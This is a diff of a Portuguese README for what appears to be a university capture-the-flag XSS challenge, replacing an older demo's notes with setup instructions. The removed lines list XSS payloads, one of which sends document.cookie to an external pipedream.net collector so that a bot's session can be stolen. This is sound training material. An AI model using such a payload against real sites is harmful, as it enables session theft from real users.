@@ -1,35 +1,49 @@
 
+# Ganesh Web Cloud
 
+## Dificuldade: **Hard** 
 
+## Descrição
 
+Um dos membros do grupo surgiu com a ideia de criar um blog para compartilhar experiências de viagens e hobbies com os outros ganeshers. Na primeira versão um dos usuários encontrou um bug de XSS que já foi corrigido e o blog foi migrado para um outro ambiente. 
 
+Você consegue encontrar e reportar novas vulnerabilidades para nosso administrador?
 
+Link do desafio: blog.ganeshicmc.com
 
-# Demonstração XSS
+*Obs: A base de dados do desafio reinicia a cada 10 minutos!*
 
-Demonstração de XSS para ser exibida na feira dos bixos. Pode ser expandido para um desafio de 
-XSS a ser usado no Ping se necessário!
+## Hints
 
-# Payloads:
+- Have you DIGed enough into the problem?
+- Having a hard time? Relax and get some cookies :)
 
-Tanto o campo nome quanto comentário podem ser utilizados para enviar o XSS na página do post.
-Após o envio basta compartilhar a URL no formulário do menu lateral para que o bot (puppeteer)
-acesse e execute o payload.
+# Setup
 
-Obs: é feita a verificação se o link pertence ou não ao site, mas como o site é vulneravel a XSS
-se alguem quiser que ele acesse outra url é bastante simples via javascript. É necessário configurar corretamente as variáveis do arquivo `.env` para garantir que tudo ocorra nos conformes.
+## Configurando os domínios
 
-```html
-<script>alert('xss');</script>
-<script>fetch('https://ent6k7fximtwm.x.pipedream.net/c=' + document.cookie);</script>
+#### Configurando os Domínios
+
+- **blog.ganeshicmc.com** e **myprofile.ganeshicmc.com** apontando para o IP da máquina
+- Subdomínios apontando como CNAMES para **myprofile.ganeshicmc.com**
+    - charles.blog.ganeshicmc.com
+    - vanloon.blog.ganeshicmc.com
+    - guerra.blog.ganeshicmc.com
+    - mono.blog.ganeshicmc.com
+    - brandt.blog.ganeshicmc.com
+    - dorime.blog.ganeshicmc.com
+    - lu.blog.ganeshicmc.com
+
+#### Configurando o Container
+
+Para buildar os containers utilize o script abaixo (obs: pode demorar um pouco pois possui algumas dependencias):
+
+```
+sudo docker-compose build
 ```
 
-# Executing the docker
+Para iniciar o desafio rode o seguinte comando (obs: necessário que a porta 80 esteja desocupada):
 
-```bash
-sudo docker build --no-cache -t "ganesh/demo-xss" .
 ```
-
-```bash
-sudo docker run -d -p "80:80" --rm --name "ganesh-demo-xss" "ganesh/demo-xss"
+sudo docker-compose up
 ```
